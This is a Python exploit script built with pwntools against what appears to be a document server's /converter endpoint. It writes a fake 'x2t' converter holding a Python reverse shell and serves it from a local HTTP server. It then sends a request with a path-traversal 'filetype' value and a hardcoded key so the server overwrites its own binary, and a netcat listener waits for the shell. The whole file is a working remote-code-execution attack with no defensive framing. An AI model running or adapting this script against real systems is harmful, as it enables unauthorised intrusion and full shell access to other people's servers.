import argparse
import requests
import os

from pwn import *
from subprocess import Popen


bash_reverse_shell ='''
#!/bin/bash
export RHOST="{}";export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
'''


def build_evil_x2t(filename, ip, port):
    with open(filename, 'w') as f:
        f.write(bash_reverse_shell.format(ip, port))


def run_http_server(port):
    os.system('python -m SimpleHTTPServer {}'.format(port))


def run_reverse_server(ip, port):
    io = process([
        'nc',
        '-l',
        '-p',
        str(port),
        ip
    ])
    return io


def pwn(
    ds_ip, ds_port,
    ev_ip, ev_port, filename,
    target_path, outputtype='txt', key='konata_keyy'
):
    url = 'http://{}:{}/converter'.format(ds_ip, ds_port)
    evil_url = 'http://{}:{}/{}'.format(ev_ip, ev_port, filename)
    filetype = './../../../../../../..{}'.format(target_path)
    
    resp = requests.post(
        url,
        json = {
            'outputtype': outputtype,
            'url': evil_url,
            'filetype': filetype,
            'key': key
        }
    ).text
    return resp


def parse_args():
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-a', '--address', type=str,
        help='Evil HTTP server IP address (current machine)')
    parser.add_argument('-p', '--port', type=int,
        help='Evil HTTP server port (current machine)')
    parser.add_argument('-x', '--x2t', type=str,
        default='x2t', help='Path to an evil x2t utility')
    parser.add_argument('-t', '--target', type=str,
        default='/proc/self/cwd/bin/x2t', help='Path to a target file')
    parser.add_argument('-ri', '--remote-ip', type=str,
        help='Reverse shell server IP address')
    parser.add_argument('-rp', '--remote-port', type=int,
        help='Reverse shell server port')
    parser.add_argument('-dsi', '--ds-ip', type=str,
        help='DocumentServer IP address')
    parser.add_argument('-dsp', '--ds-port', type=int,
        help='DocumentServer port')

    args = parser.parse_args()
    
    ip          = args.address
    port        = args.port
    x2t         = args.x2t
    target      = args.target
    rev_ip      = args.remote_ip
    rev_port    = args.remote_port
    ds_ip       = args.ds_ip
    ds_port     = args.ds_port

    return ip, port, x2t, target, rev_ip, rev_port, ds_ip, ds_port


def main():
    ip, port, x2t_path, target_file, rev_ip, rev_port, ds_ip, ds_port = parse_args()

    log.info('creating an evil x2t file locally...')
    build_evil_x2t(x2t_path, rev_ip, rev_port)

    log.info('run a local http server... (python -m SimpleHTTPServer <port>)')
    # run_http_server(port)
    pause()
    
    log.info('run a reverse shell server... (nc -l -p 31337 0.0.0.0)')
    # rev_server = run_reverse_server(rev_ip, rev_port)
    pause()

    # This request will force the ending document server to
    # take our evil x2t utility and replace it with the original
    # one on the remote.
    #
    # Malicious x2t will connect to our reverse shell and will
    # spawn a shell
    log.info('sending a malicious request to DS')
    pwn(
        ds_ip, ds_port,
        ip, port, x2t_path,
        target_file, outputtype='odt'
    )
    log.success('spawned reverse shell')

    # rev_server.interactive()


if __name__ == '__main__':
    main()